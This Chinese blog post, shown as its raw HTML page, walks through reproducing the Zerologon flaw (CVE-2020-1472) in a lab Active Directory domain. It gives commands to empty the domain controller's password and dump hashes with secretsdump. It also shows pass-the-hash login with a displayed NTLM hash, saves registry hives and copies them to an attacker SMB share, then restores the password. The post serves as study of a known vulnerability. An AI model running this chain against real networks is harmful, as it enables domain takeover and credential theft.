<!DOCTYPE html>
<html lang=zh-CN>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta property="og:description" content="z4yn的博客">
    <meta property="og:type" content="website">
    <meta name="description" content="z4yn的博客">
    <meta name="keyword"  content="OSCP,PTE">
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        CVE-2020-1472 Netlogon权限提升 - Z4yn&#39;s blog
        
    </title>

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/aircloud.css">

    
<link rel="stylesheet" href="/css/gitment.css">

    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Z4yn's blog" type="application/atom+xml">
</head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
    <i> Better to light one candle than to curse the darkness. </i>
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar ">
            <img src="/img/avatar.jpg" />
        </div>
        <div class="name">
            <i>Z4yn&#39;s blog</i>
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li >
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>主页</span>
                </a>
            </li>
            <li >
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>标签</span>
                </a>
            </li>
            <li >
                <a href="/archive">
                    <i class="iconfont icon-guidang2"></i>
                    <span>存档</span>
                </a>
            </li>
            <li >
                <a href="/collect/">
                    <i class="iconfont icon-shoucang1"></i>
                    <span>收藏</span>
                </a>
            </li>
            <li >
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>关于</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>搜索</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-%E7%9B%AE%E5%BD%95"><span class="toc-text"># 0x00 目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text"># 0x01 漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text"># 0x02 漏洞利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E5%A4%8D%E7%8E%B0%E5%B7%A5%E5%85%B7"><span class="toc-text"># 0x03 复现工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text"># 0x04 漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0-%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E8%84%9A%E6%9C%AC"><span class="toc-text">0). 漏洞验证脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%9B%B4%E6%94%B9dc%E5%AF%86%E7%A0%81%E4%B8%BA%E7%A9%BA"><span class="toc-text">1).  更改dc密码为空</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E8%BF%98%E5%8E%9F%E5%AF%86%E7%A0%81"><span class="toc-text">2).  还原密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-text">#1 第一种方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-text">#2 第二种方法</span></a></li></ol></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-bg" id="search-bg"></div>
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input"/>
            <span id="begin-search">搜索</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i> Better to light one candle than to curse the darkness. </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        CVE-2020-1472 Netlogon权限提升
    </div>

    <div class="post-meta">
        <span class="attr">发布于：<span>2022-11-07 14:27:44</span></span>
        
        <span class="attr">标签：/
        
        <a class="tag" href="/tags/#CVE-2020-1472" title="CVE-2020-1472">CVE-2020-1472</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
</span>
</span>
    </div>
    <div class="post-content no-indent">
        <h3 id="0x00-目录"><a href="#0x00-目录" class="headerlink" title="# 0x00 目录"></a># 0x00 目录</h3><ol>
<li>漏洞分析</li>
<li>漏洞利用条件</li>
<li>漏洞利用</li>
</ol>
<hr>
<h3 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="# 0x01 漏洞分析"></a># 0x01 漏洞分析</h3><p>攻击者在通过NetLogon ( MS-NRPC)协议与AD域控建立安全通道时，可利用该漏洞将AD域控的计算机账号密码置为空，从而控制域控服务器。Netlogon使用的AES认证算法中的vi向量默认为o，导致攻击者可以绕过认证，可以向域发起Netlogon计算机账户认证请求,使用8字节全0 client challenge不断尝试得到一个正确的8字节全O client credential通过认证，再通过相关调用完成对域控密码的修改。</p>
<p>影响版本</p>
<ul>
<li>Windows Server 2008 R2 for x64-based Systems Service Pack 1</li>
<li>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</li>
<li>Windows Server 2012</li>
<li>Windows Server 2012 (Server Core installation)</li>
<li>Windows Server 2012 R2</li>
<li>Windows Server 2012 R2 (Server Core installation)</li>
<li>Windows Server 2016</li>
<li>Windows Server 2016 (Server Core installation)</li>
<li>Windows Server 2019</li>
<li>Windows Server 2019 (Server Core installation)</li>
<li>Windows Server, version 1903 (Server Core installation)</li>
<li>Windows Server, version 1909 (Server Core installation)</li>
<li>Windows Server, version 2004 (Server Core installation)</li>
</ul>
<hr>
<h3 id="0x02-漏洞利用条件"><a href="#0x02-漏洞利用条件" class="headerlink" title="# 0x02 漏洞利用条件"></a># 0x02 漏洞利用条件</h3><ol>
<li>与域控通讯（在不在域内都行）</li>
<li>能访问域控MS-NRPC服务，</li>
</ol>
<p>当攻击者使用Netlogon远程协议(MS-NRPC)建立与域控制器连接的易受攻击的 Netlogon安全通道时，存在特权提升漏洞。成功利用此漏洞的攻击者可以在网络中的设备上运行经特殊设计的应用程序。</p>
<p>要利用此漏洞，未通过身份验证的攻击者需要将MS-NRPC连接到域控制器，以获取域管理员访问权限。</p>
<hr>
<h3 id="0x03-复现工具"><a href="#0x03-复现工具" class="headerlink" title="# 0x03 复现工具"></a># 0x03 复现工具</h3><p>漏洞验证工具：<a target="_blank" rel="noopener" href="https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py">https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py</a></p>
<p>漏洞利用工具：<a target="_blank" rel="noopener" href="https://github.com/risksense/zerologon/blob/master/set_empty_pw.py">https://github.com/risksense/zerologon/blob/master/set_empty_pw.py</a></p>
<p>密码重置工具：<a target="_blank" rel="noopener" href="https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py">https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py</a></p>
<h3 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="# 0x04 漏洞复现"></a># 0x04 漏洞复现</h3><h4 id="0-漏洞验证脚本"><a href="#0-漏洞验证脚本" class="headerlink" title="0). 漏洞验证脚本"></a>0). 漏洞验证脚本</h4><p>获取dc主机名</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows：nbtstat -<span class="keyword">A</span> <span class="number">10.10.10.8</span></span><br><span class="line">Linux：nbtscan</span><br></pre></td></tr></table></figure>



<p>漏洞验证工具：zerologon_tester.py</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python3</span> zerologon_tester.py OWA <span class="number">10.10.10.8</span></span><br></pre></td></tr></table></figure>

<p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/ad4c8bc4c00f7fcc8539b0c6d69f6107.png" alt="image-20220810131156397"></p>
<h4 id="1-更改dc密码为空"><a href="#1-更改dc密码为空" class="headerlink" title="1).  更改dc密码为空"></a>1).  更改dc密码为空</h4><p>利用set_empty_pw.py将dc密码设置为空，即<code>31d6cfe0d16ae931b73c59d7e0c089c0</code>在利用secretsdump.py读dc的hash</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python3</span> set_empty_pw.py OWA <span class="number">10.10.10.8</span>  <span class="comment">#OWA为域控主机名</span></span><br><span class="line">impacket-secretsdump redteam.red/OWA\$@<span class="number">10.10.10.8</span> -<span class="literal">no</span>-pass</span><br></pre></td></tr></table></figure>

<p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/4a7a9f5050bc6d5e2c012d25e94ddb30.png" alt="image-20220810133549444"></p>
<p>获取到域管理员administrator用户hash：redteam.red\Administrator:500:aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4:::</p>
<p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/0deb21948f62266afccca6532636e63c.png" alt="image-20220810152925651"></p>
<p>pth登录</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">impacket</span>-wmiexec redteam.red/Administrator@<span class="number">10.10.10.8</span> -hashes :<span class="number">579</span>da<span class="number">618</span>cfbfa<span class="number">85247</span>acf<span class="number">1</span>f<span class="number">800</span>a<span class="number">280</span>a<span class="number">4</span> -codec gb<span class="number">2312</span></span><br></pre></td></tr></table></figure>

<p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/5ab8efe26779c0c580977b9d345a4d50.png" alt="image-20220810162528929"></p>
<p><strong>因为密码置空后，用户在 AD 中的密码（ntds.dic）与本地的注册表 /lsass 里面的密码不一致，会脱离域控，所以要将其恢复</strong>。</p>
<h4 id="2-还原密码"><a href="#2-还原密码" class="headerlink" title="2).  还原密码"></a>2).  还原密码</h4><h4 id="1-第一种方法"><a href="#1-第一种方法" class="headerlink" title="#1 第一种方法"></a>#1 第一种方法</h4><p>密码还原工具restorepassword.py：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/dirkjanm/CVE-2020-1472/master/restorepassword.py">https://raw.githubusercontent.com/dirkjanm/CVE-2020-1472/master/restorepassword.py</a></p>
<p>利用plain_password_hex</p>
<p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/5c3a8ee428689c54755d1ca0dd3c9525.png" alt="image-20220810143125888"></p>
<p>用restorepassword.py将密码还原，还原后利用空口令登录失败</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 restorepassword.py redteam.red/owa@owa -target-ip 10.10.10.8 -hexpass 595ee95117c30b874201c95971f38dd5ae0a97a564a70a366977619ea5cb3e3f18f4a4e9f3d99ec0e676e2a75594afec2ad567081ac566b118c7941e1e247a4855dd3c50edb5ed236e5cc17cf7336deb6291183f034dad603d1f475228f6d39cbea07b85335c85c554071bfa9fbc45c0f036e21e25da514c272e92db7e160d46aa1b298539cfa5f5c83773a9901983443c999e2750972f5aca71461217ecf84c7fdaca9deb1ca0000e88a587ea3aea6183db82ed5f9e66603568c2708f395e3ed96997254a8dd25b5afc06dd52c52f25e063d7b782cfa2e40667eb2bc2a4b0830f1199db0b4b4ef9ab599f983a18a567</span><br></pre></td></tr></table></figure>

<p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/aad8f7c2a28fe1f0f0ae1f0525bdc8d2.png" alt="image-20220810143023360"></p>
<h4 id="2-第二种方法"><a href="#2-第二种方法" class="headerlink" title="#2 第二种方法"></a>#2 第二种方法</h4><p>从注册表/lsass里面读取机器用户原先的密码，恢复AD里面的密码</p>
<p>利用redteam.red/administrator hash登录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-wmiexec redteam.red/Administrator@10.10.10.8 -hashes :579da618cfbfa85247acf1f800a280a4 -codec gb2312</span><br></pre></td></tr></table></figure>

<p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/903fb9e42a3015d99e4cca47e86eeccc.png" alt="image-20220810153151365"></p>
<p>读取sam、system、security文件</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">reg</span> <span class="keyword">save</span> hklm\sam sam.hive</span><br><span class="line"><span class="keyword">reg</span> <span class="keyword">save</span> hklm\system system.hive</span><br><span class="line"><span class="keyword">reg</span> <span class="keyword">save</span> hklm\security security.hive</span><br></pre></td></tr></table></figure>

<p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/acaa94a386ea3d32f427090193558e16.png" alt="image-20220810153451987"></p>
<p>通过SMB share复制回攻击机</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\&gt;</span>copy sam.hive <span class="symbol">\\</span>10.10.10.128<span class="symbol">\s</span>hare<span class="symbol">\s</span>am.hive</span><br><span class="line">已复制         1 个文件。</span><br><span class="line"></span><br><span class="line">C:<span class="symbol">\&gt;</span>copy security.hive <span class="symbol">\\</span>10.10.10.128<span class="symbol">\s</span>hare<span class="symbol">\s</span>ecurity.hive</span><br><span class="line">已复制         1 个文件。</span><br><span class="line"></span><br><span class="line">C:<span class="symbol">\&gt;</span>copy system.hive <span class="symbol">\\</span>10.10.10.128<span class="symbol">\s</span>hare<span class="symbol">\s</span>ystem.hive</span><br><span class="line">已复制         1 个文件。</span><br><span class="line"></span><br><span class="line">C:<span class="symbol">\&gt;</span>exit</span><br></pre></td></tr></table></figure>

<p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/cc093d005f3aedfa5facda684b6cd700.png" alt="image-20220810153845364"></p>
<p>或者利用impacket-smbclient链接到smb将文件下载到本地。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">impacket</span>-smbclient redteam.red/administrator@<span class="number">10.10.10.8</span> -hashes :<span class="number">579</span>da<span class="number">618</span>cfbfa<span class="number">85247</span>acf<span class="number">1</span>f<span class="number">800</span>a<span class="number">280</span>a<span class="number">4</span></span><br><span class="line"><span class="comment"># use c$</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="comment"># get sam.hive</span></span><br><span class="line"><span class="comment"># get security.hive</span></span><br><span class="line"><span class="comment"># get system.hive</span></span><br><span class="line"><span class="comment"># exit</span></span><br></pre></td></tr></table></figure>

<p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/b905ef8ec45562a91c609ac83ae2d1d9.png" alt="image-20220810154730324"></p>
<p>利用secretsdump 读取到hash</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.hive  -<span class="keyword">system</span> <span class="keyword">system</span>.hive  -<span class="keyword">security</span> <span class="keyword">security</span>.hive <span class="keyword">LOCAL</span></span><br></pre></td></tr></table></figure>

<p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/2ae82be519b899cab986509040e36729.png" alt="image-20220810160422687"></p>
<p>利用reinstall_original_pw.py将密码恢复。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python3</span> reinstall_original_pw.py owa <span class="number">10.10.10.8</span> <span class="number">4</span>e<span class="number">4890</span>dbf<span class="number">2</span>da<span class="number">33</span>f<span class="number">3</span>ce<span class="number">4087</span>f<span class="number">5</span>dd<span class="number">6</span>a<span class="number">4</span>dba</span><br></pre></td></tr></table></figure>

<p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/29a737488a1edfa98f9ad7bc71775279.png" alt="image-20220810160619182"></p>

        
        <br />
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>
        <div id="lv-container"></div>
        <div class="giscus"></div>
    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "search.json"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>

<script src="/js/index.js"></script>

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>






</html>
